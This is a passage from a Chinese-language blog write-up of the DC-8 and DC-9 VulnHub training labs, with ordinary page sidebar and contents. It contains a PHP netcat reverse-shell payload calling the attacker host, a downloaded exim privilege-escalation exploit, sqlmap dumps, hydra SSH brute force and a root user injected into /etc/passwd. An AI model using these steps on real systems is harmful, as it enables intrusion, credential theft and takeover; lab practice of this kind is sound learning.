<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c50703f.png" alt="image-20240724202350261.png"></p>
<p>这么复杂肯定加密过，把这两段hash值保存在一个文件中，用john爆破一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c532b03.png" alt="image-20240724202731646.png"></p>
<p>只爆出john的密码turtle，ssh连不上，可以登进后台，然后就是找getshell点，根据之前几个靶场的经验，还是很好找的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c65c257.png" alt="image-20240724210020933.png"></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>getshell<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.111.128 2333&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>最好加上一行html，之前一直不行，我加上后就弹成功了，记得勾选Confirmation page，保存后sumbit即可触发，交互式shell</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Linux提权-3"><a href="#Linux提权-3" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>sudo -l要密码，啥都看不到，suid看看</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c67fa7e.png" alt="image-20240724211429251.png"></p>
<p>前面有个靶场看wp尝试过exim4，失败了，但这里可以用exim4提权，看下版本</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim <span class="comment">--version</span></span><br></pre></td></tr></table></figure>

<p>版本是4.89，再在searchsploit上找找</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> exim <span class="number">4</span> </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c688d31.png" alt="image-20240724211822661.png"></p>
<p>先在kali上</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local<span class="regexp">/46996.sh /</span>home<span class="regexp">/kali/</span>Desktop/<span class="number">46996</span>.sh</span><br><span class="line">python -m http.server <span class="number">8888</span>              </span><br><span class="line">dos2unix <span class="number">46996</span>.sh                 <span class="regexp">//</span>将脚本处理为linux环境中可执行的</span><br></pre></td></tr></table></figure>

<p>再在靶机上</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /tmp</span><br><span class="line">wget 192.168.111.128:8888/46996.<span class="keyword">sh</span></span><br><span class="line">chmod 777 46996.<span class="keyword">sh</span></span><br><span class="line">./46996.<span class="keyword">sh</span> -<span class="keyword">m</span> netcat                   <span class="comment">//按sh脚本提示执行文件</span></span><br></pre></td></tr></table></figure>

<p>不知道为啥root权限过一会就没了，搞快点拿flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a354c71af10.png" alt="image-20240724214414861.png"></p>
<h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>呃感觉没学到什么新东西，还是之前靶场那几套做法</p>
<h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip">https://download.vulnhub.com/dc/DC-9.zip</a></p>
<h2 id="信息收集-8"><a href="#信息收集-8" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.141</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355943761c.png" alt="image-20240724220732437.png"></p>
<p>还是80端口的web服务和22端口的ssh，ssh爆破了一下没用，22端口显示filtered表示数据包被拦截了，不知道端口是开的还是关的，扫下目录也没啥东西，进web页面看看，点Search是个查询的，Manage是个登录的，都试了下万能密码，Search直接把全部人员信息爆出来了，登录那没用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35595af197.png" alt="image-20240724221345672.png"></p>
<h2 id="渗透过程-5"><a href="#渗透过程-5" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>sqlmap先梭再说，抓了个包，发现是POST传参search</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.141/results.php&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> <span class="attr">--method</span>=POST <span class="attr">--data</span>=<span class="string">&#x27;search=1&#x27;</span> -dbs              <span class="comment">//查库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.141/results.php&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> <span class="attr">--method</span>=POST <span class="attr">--data</span>=<span class="string">&#x27;search=1&#x27;</span> -D <span class="string">&#x27;Staff&#x27;</span> -tables              <span class="comment">//查表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.141/results.php&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> <span class="attr">--method</span>=POST <span class="attr">--data</span>=<span class="string">&#x27;search=1&#x27;</span> -D <span class="string">&#x27;Staff&#x27;</span> -T <span class="string">&#x27;Users&#x27;</span> -<span class="attribute">columns</span>              //查列名</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.141/results.php&quot;</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--batch</span> <span class="attr">--method</span>=POST <span class="attr">--data</span>=<span class="string">&#x27;search=1&#x27;</span> -D <span class="string">&#x27;Staff&#x27;</span> -T <span class="string">&#x27;Users&#x27;</span> -C <span class="string">&#x27;Username,Password,UserID&#x27;</span> -dump              <span class="comment">//查数据</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3559440000.png" alt="image-20240725132434678.png"></p>
<p>爆出来admin的密码，是个md5加密后的值，找个在线网站爆一下得到密码transorbital1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355959204d.png" alt="image-20240725132706377.png"></p>
<p>可以登进后台，ssh连不上，后台进去后就多了个Add Record，点进去发现下面有个File does not exist，想起之前有个靶场下面是显示年份，就是包含了一个文件，这里大胆猜测一下这里也存在文件包含</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355943a84a.png" alt="image-20240725133138959.png"></p>
<p>大胆猜测一波file</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355947aace.png" alt="image-20240725135437009.png"></p>
<p>哇真的是你啊，省去fuzz了，刚才连ssh的时候不是密码不正确，而是显示连接被拒绝了，考虑到ssh端口关闭，可能是开启了knock服务，参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a></p>
<p>一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件，看看，真有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355943d65b.png" alt="image-20240725214533265.png"></p>
<p>用netcat连接一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -z <span class="number">192.168.111.141</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-z：这个选项告诉 netcat 进行一个 “zero connect” 操作，即尝试连接到目标地址，但不发送任何数据，并且立即断开连接。这通常用于端口扫描</p>
</blockquote>
<p>然后再扫描一次端口就会发现22端口开了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a355943766b.png" alt="image-20240725215524173.png"></p>
<p>但是admin连不上，刚才sqlmap跑出一个user库，里面有很多用户密码，再去看一下，把信息分别存进user.txt和pass.txt里用hydra爆破一下ssh看能不能行</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.111.141/results.php&quot;</span> <span class="attribute">--level</span>=5 <span class="attribute">--risk</span>=3 --batch <span class="attribute">--method</span>=POST <span class="attribute">--data</span>=<span class="string">&#x27;search=1&#x27;</span> -D <span class="string">&#x27;users&#x27;</span> -dump</span><br></pre></td></tr></table></figure>

<p>用hydra爆破</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user<span class="selector-class">.txt</span> -P pass<span class="selector-class">.txt</span> ssh:<span class="comment">//192.168.111.141</span></span><br></pre></td></tr></table></figure>

<p>爆出三个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35595b29d1.png" alt="image-20240725220253906.png"></p>
<p>其中janitor用户有东西，ls -al发现有个隐藏目录<code>.secrets-for-putin</code></p>
<blockquote>
<p><code>-a</code>: 这个选项告诉 <code>ls</code> 命令显示所有文件，包括那些以点（<code>.</code>）开头的隐藏文件</p>
</blockquote>
<p>进去后有个txt，里面是些密码，把它们加进pass.txt再爆一下ssh，果然，又出了个用户</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fredf</span>:B4-Tru3-<span class="number">001</span></span><br></pre></td></tr></table></figure>

<p>sudo -l发现一个可以以root权限执行的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35595df1e2.png" alt="image-20240725222853355.png"></p>
<h2 id="Linux提权-4"><a href="#Linux提权-4" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>test文件时有执行权限的，但打开确实一堆乱码，应该是个程序，比如exe之类的，往test文件所在目录上两级目录时发现有test.py和test.spec，所以test文件那个程序应该就是test.py生成的，看看test.py干了些啥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3560946e87.png" alt="image-20240725223246651.png"></p>
<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面，可以向文件中写入一个自创的有root权限的用户，运行后就可以登录得到root权限达到提权的目的，先用openssl命令创建一个密码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt <span class="number">6</span>s6 <span class="number">6</span>s6</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-1为MD5加密算法，-salt后面为指定盐值，最后面为需要加密的密码明文</p>
</blockquote>
<p>得到hash密码：$1$6s6$9BP4eSJdWRvVFLjC08rO61</p>
<p>为了方便，就在tmp目录下创建文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cd</span> /tmp</span><br><span class="line"><span class="attribute">echo</span> &#x27;<span class="number">6</span>s6:$<span class="number">1</span>$<span class="number">6</span>s6$<span class="number">9</span>BP4eSJdWRvVFLjC08rO61:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/bash&#x27; &gt; <span class="number">6</span>s6</span><br></pre></td></tr></table></figure>

<p>然后回到test文件所在目录执行test程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/devstuff/dist/test</span><br><span class="line">sudo ./test /tmp/6s6 /etc/passwd</span><br></pre></td></tr></table></figure>

<p>最后su切换用户，在root目录下找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a356097ccc3.png" alt="image-20240725224340441.png"></p>
<p>完结撒花</p>
<h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>还是同样的流程和思路，但还是学到一些新东西，比如knock服务和用openssl加密</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>打完这几个靶场，感觉思路都差不多，就是扫到开放的端口，然后每个测测，有web服务的就先从web服务渗透，然后拿到shell后就是各种提权，cve啥的，也不知道真实环境会怎么样，但应该比这个更复杂，感觉也算是入门了？听实验室的渗透佬说要学的提权还很多，打这个学学思路就可以了，又想起之前有人跟我说感觉渗透最重要的一步就是信息收集，确实，信息收集的越多越详细打的就越轻松，思路也会很清晰</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/14038071.html">https://www.cnblogs.com/Lmg66/p/14038071.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606?type=blog">https://blog.csdn.net/l2872253606?type=blog</a></p>
<p><a target="_blank" rel="noopener" href="https://uu2fu3o.gitbook.io/articles">https://uu2fu3o.gitbook.io/articles</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung">https://www.cnblogs.com/yuy0ung</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://C0rnfl0w3r.github.io">6s6</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0rnfl0w3r.github.io/2024/07/26/DC%E9%9D%B6%E6%9C%BA1-9/">http://c0rnfl0w3r.github.io/2024/07/26/DC靶机1-9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://C0rnfl0w3r.github.io" target="_blank">6s6's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/24/CC7/" title="CC7"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CC7</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">6s6</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">QQ：Mjg2OTg3Mzk1OQ==</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1"><span class="toc-text">DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87IP%E5%9C%B0%E5%9D%80"><span class="toc-text">探测目标IP地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87IP%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">探测目标IP开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">网页信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F"><span class="toc-text">数据库渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">用户密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Liunx%E6%8F%90%E6%9D%83"><span class="toc-text">Liunx提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-2"><span class="toc-text">DC-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87IP"><span class="toc-text">探测目标IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">探测开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-text">网页信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E7%AB%AF%E6%B8%97%E9%80%8F"><span class="toc-text">Web端渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8"><span class="toc-text">生成字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-text">爆破用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-text">爆破密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E7%AB%AF%E6%B8%97%E9%80%8F"><span class="toc-text">主机端渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-text">ssh远程登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rbash%E9%80%83%E9%80%B8%EF%BC%88linux%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-text">rbash逃逸（linux提权）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vi%E8%AE%BE%E7%BD%AEshell%E6%8F%90%E6%9D%83"><span class="toc-text">vi设置shell提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BASH-CMDS%E8%AE%BE%E7%BD%AEshell"><span class="toc-text">BASH_CMDS设置shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%8F%90%E6%9D%83"><span class="toc-text">git提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE"><span class="toc-text">漏洞查找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#joomscan"><span class="toc-text">joomscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit"><span class="toc-text">searchsploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-text">破解密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-text">Linux提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-4"><span class="toc-text">DC-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Liunx%E6%8F%90%E6%9D%83-1"><span class="toc-text">Liunx提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-5"><span class="toc-text">DC-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B-1"><span class="toc-text">渗透过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83-1"><span class="toc-text">Linux提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-6"><span class="toc-text">DC-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B-2"><span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83-2"><span class="toc-text">Linux提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-7"><span class="toc-text">DC-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-6"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B-3"><span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-8"><span class="toc-text">DC-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-7"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B-4"><span class="toc-text">渗透过程</span></a></li><li class="toc-item toc-level-2"><a 